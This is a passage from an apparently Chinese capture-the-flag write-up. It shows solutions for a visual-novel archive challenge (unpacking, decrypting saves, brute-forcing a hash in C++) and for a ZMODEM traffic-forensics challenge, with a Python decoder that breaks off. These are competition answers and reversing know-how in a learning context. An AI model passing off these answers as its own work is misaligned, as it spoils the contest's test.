<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(b, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(c, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">a</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)</span><span style="color: #4876D6">b</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #4876D6">c</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(a, </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">, N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> N; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">putchar</span><span style="color: #403F53">(</span><span style="color: #4876D6">a</span><span style="color: #403F53">[i]);</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/poly-flag3.357367d9.webp"><img srcset="/assets/poly-flag3.8bb1c473.png" loading="lazy" src="/assets/poly-flag3.8bb1c473.png" width="486" height="53" alt="flag3"></picture></p>
<h3 id="汉化绿色版免费下载" class="heading"><a href="#汉化绿色版免费下载" class="heading-anchor" aria-label="章节： 汉化绿色版免费下载" tabindex="-1"></a><span>汉化绿色版免费下载</span></h3>
<h4 id="level-1-14" class="heading"><a href="#level-1-14" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>使用 <a href="https://github.com/storycraft/xp3-tool">xp3-tool</a> 解压 <code>data.xp3</code><span class="mojikumi-line-end">，</span>在 <code>scenario<wbr>/<wbr>done<wbr>.<wbr>ks</code> 中看到 flag<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88-flag1.7938408e.webp"><img srcset="/assets/%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88-flag1.eff7150f.png" loading="lazy" src="/assets/%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88-flag1.eff7150f.png" width="945" height="65" alt="flag1"></picture></p>
<h4 id="level-2-11" class="heading"><a href="#level-2-11" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>根据 <code>scenario</code> 中的文件<span class="mojikumi-line-end">，</span>可以发现检查两次输入是否相同是通过计算 hash 实现的<span class="mojikumi-line-end">。</span></p>
<p>使用 <a href="https://github.com/arcusmaximus/KirikiriTools">KirikiriDescrambler</a> 解密 <code>savedata</code> 中的文件<span class="mojikumi-line-end">，</span>在 <code>data0.kdt</code> 中得到 round 1 的 hash 为 7748521<span class="mojikumi-line-end">，</span>在 <code>datasu.ksd</code> 中得到每个字符使用的次数<span class="mojikumi-line-end">，</span>然后枚举排列得到 flag<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-33"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-33--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">algorithm</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">cstdio</span><span style="color: #D9F5DD">&gt;</span></span>
<span><span style="color: #C792EA">#include</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&lt;</span><span style="color: #ECC48D">vector</span><span style="color: #D9F5DD">&gt;</span></span>
<span></span>
<span><span style="color: #C792EA">using</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">namespace</span><span style="color: #D6DEEB"> std;</span></span>
<span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> mod </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">125e591</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">13337</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> start </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1337</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> target </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">7748521</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> charset[] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D"> AEIOU</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #C792EA">bool</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">check</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> vector&lt;</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB">&gt; </span><span style="color: #C792EA">&amp;</span><span style="color: #D7DBE0">a</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> h </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> start;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> x : a)</span></span>
<span><span style="color: #D6DEEB">        h </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">1</span><span style="color: #FFEB95">ll</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> h </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> x </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">11</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">    h </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">1</span><span style="color: #FFEB95">ll</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> h </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">66</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> h </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> target;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">main</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    vector</span><span style="color: #C792EA">&lt;int&gt;</span><span style="color: #D6DEEB"> a </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">3</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">};</span></span>
<span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">do</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (</span><span style="color: #82AAFF">check</span><span style="color: #D6DEEB">(a))</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> x : a)</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">putchar</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">charset</span><span style="color: #D6DEEB">[x]);</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">break</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span><span style="color: #D6DEEB">    } </span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> (</span><span style="color: #82AAFF">next_permutation</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">.</span><span style="color: #82AAFF">begin</span><span style="color: #D6DEEB">(), </span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">.</span><span style="color: #82AAFF">end</span><span style="color: #D6DEEB">()));</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">algorithm</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">cstdio</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">vector</span><span style="color: #111111">&gt;</span></span>
<span></span>
<span><span style="color: #994CC3">using</span><span style="color: #403F53"> </span><span style="color: #994CC3">namespace</span><span style="color: #403F53"> std;</span></span>
<span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> mod </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0x125e591</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> k </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">13337</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> start </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1337</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> target </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">7748521</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">char</span><span style="color: #403F53"> charset[] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765"> AEIOU</span><span style="color: #111111">&quot;</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #994CC3">bool</span><span style="color: #403F53"> </span><span style="color: #4876D6">check</span><span style="color: #403F53">(</span><span style="color: #994CC3">const</span><span style="color: #403F53"> vector&lt;</span><span style="color: #994CC3">int</span><span style="color: #403F53">&gt; </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">a)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">int</span><span style="color: #403F53"> h </span><span style="color: #994CC3">=</span><span style="color: #403F53"> start;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> x : a)</span></span>
<span><span style="color: #403F53">        h </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #AA0982">1ll</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53"> h </span><span style="color: #994CC3">*</span><span style="color: #403F53"> k </span><span style="color: #994CC3">+</span><span style="color: #403F53"> x </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">11</span><span style="color: #403F53">) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">    h </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #AA0982">1ll</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53"> h </span><span style="color: #994CC3">*</span><span style="color: #403F53"> k </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">66</span><span style="color: #403F53">) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53"> h </span><span style="color: #994CC3">==</span><span style="color: #403F53"> target;</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">main</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    vector</span><span style="color: #994CC3">&lt;int&gt;</span><span style="color: #403F53"> a </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {</span><span style="color: #AA0982">1</span><span style="color: #403F53">, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, </span><span style="color: #AA0982">2</span><span style="color: #403F53">, </span><span style="color: #AA0982">2</span><span style="color: #403F53">, </span><span style="color: #AA0982">2</span><span style="color: #403F53">, </span><span style="color: #AA0982">3</span><span style="color: #403F53">, </span><span style="color: #AA0982">4</span><span style="color: #403F53">, </span><span style="color: #AA0982">4</span><span style="color: #403F53">, </span><span style="color: #AA0982">4</span><span style="color: #403F53">, </span><span style="color: #AA0982">4</span><span style="color: #403F53">, </span><span style="color: #AA0982">4</span><span style="color: #403F53">, </span><span style="color: #AA0982">4</span><span style="color: #403F53">};</span></span>
<span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">do</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (</span><span style="color: #4876D6">check</span><span style="color: #403F53">(a))</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> x : a)</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">putchar</span><span style="color: #403F53">(</span><span style="color: #4876D6">charset</span><span style="color: #403F53">[x]);</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">break</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">        }</span></span>
<span><span style="color: #403F53">    } </span><span style="color: #994CC3">while</span><span style="color: #403F53"> (</span><span style="color: #4876D6">next_permutation</span><span style="color: #403F53">(</span><span style="color: #4876D6">a</span><span style="color: #403F53">.</span><span style="color: #4876D6">begin</span><span style="color: #403F53">(), </span><span style="color: #4876D6">a</span><span style="color: #403F53">.</span><span style="color: #4876D6">end</span><span style="color: #403F53">()));</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88-flag2.f0b5136c.webp"><img srcset="/assets/%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88-flag2.33aa1c5a.png" loading="lazy" src="/assets/%E6%B1%89%E5%8C%96%E7%BB%BF%E8%89%B2%E7%89%88-flag2.33aa1c5a.png" width="191" height="56" alt="flag2"></picture></p>
<h2 id="forensics" class="heading"><a href="#forensics" class="heading-anchor" aria-label="章节： Forensics" tabindex="-1"></a><span>Forensics</span></h2>
<h3 id="z-公司的服务器" class="heading"><a href="#z-公司的服务器" class="heading-anchor" aria-label="章节： Z 公司的服务器" tabindex="-1"></a><span>Z 公司的服务器</span></h3>
<h4 id="level-1-15" class="heading"><a href="#level-1-15" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>在 <code>konsole</code> 中使用 <code>nc</code> 连接到实例会提示为 ZMODEM 选择存储位置<span class="mojikumi-line-end">，</span>但选完之后会报错<span class="mojikumi-line-end">，</span>不知道是为什么<span class="mojikumi-line-end">。</span>但知道是 ZMODEM 就可以在网上搜索工具<span class="mojikumi-line-end">，</span>最后搜到的是 Windows 下的 Tera Term<span class="mojikumi-line-end">，</span>总之它可以正常工作<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">，</span>连上实例选择 ZMODEM receive 即可<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/zserver-teraterm.3c4da8f7.webp"><img srcset="/assets/zserver-teraterm.c0f14226.png" loading="lazy" src="/assets/zserver-teraterm.c0f14226.png" width="509" height="605" alt="Tera Term"></picture></p>
<p><picture><source type="image/webp" srcset="/assets/zserver-flag1.58ba3698.webp"><img srcset="/assets/zserver-flag1.d637d1a1.png" loading="lazy" src="/assets/zserver-flag1.d637d1a1.png" width="624" height="57" alt="flag1"></picture></p>
<h4 id="level-2-12" class="heading"><a href="#level-2-12" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>要分析 ZMODEM 流量<span class="mojikumi-line-end">，</span>搜一下发现了 <a href="https://zhuanlan.zhihu.com/p/579720546">手撸ZMODEM协议 - 知乎</a><span class="mojikumi-line-end">，</span>其中比较重要的是遇到 <code>0x18</code> 后面一个字符会转义<span class="mojikumi-line-end">。</span>按照这个规则<span class="mojikumi-line-end">，</span>参考其给出的 <a href="https://gitee.com/scu319hy/szrz_handler/tree/master">代码</a><span class="mojikumi-line-end">，</span>可以写一个简化的数据提取<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-34"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-34--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">with</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">level2.bin</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">rb</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">as</span><span style="color: #D6DEEB"> f:</span></span>
<span><span style="color: #D6DEEB">    data </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> f.</span><span style="color: #B2CCD6">read</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #D6DEEB">result </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span><span style="color: #D6DEEB">esc </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">False</span></span>
<span><span style="color: #D6DEEB">skip </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #D6DEEB">i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">data</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    i </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #D6DEEB">    c </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> data[i]</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">18</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        esc </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">True</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">continue</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> esc:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">60</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">40</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> skip:</span></span>
<span><span style="color: #D6DEEB">                skip </span><span style="color: #C792EA">-=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">                result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c </span><span style="color: #C792EA">^</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">40</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            skip </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">elif</span><span style="color: #D6DEEB"> skip:</span></span>
<span><span style="color: #D6DEEB">        skip </span><span style="color: #C792EA">-=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    esc </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">False</span></span>
<span></span>
<span><span style="color: #C792EA">with</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">level2.out</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">wb</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">as</span><span style="color: #D6DEEB"> f:</span></span>
<span><span style="color: #D6DEEB">    f.</span><span style="color: #B2CCD6">write</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">bytes</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">result</span><span style="color: #D6DEEB">))</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">with</span><span style="color: #403F53"> </span><span style="color: #4876D6">open</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">level2.bin</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">rb</span><span style="color: #111111">&#39;</span><span style="color: #403F53">) </span><span style="color: #994CC3">as</span><span style="color: #403F53"> f:</span></span>
<span><span style="color: #403F53">    data </span><span style="color: #994CC3">=</span><span style="color: #403F53"> f.</span><span style="color: #0C969B">read</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #403F53">result </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span><span style="color: #403F53">esc </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #BC5454">False</span></span>
<span><span style="color: #403F53">skip </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #403F53">i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">data</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    i </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span>
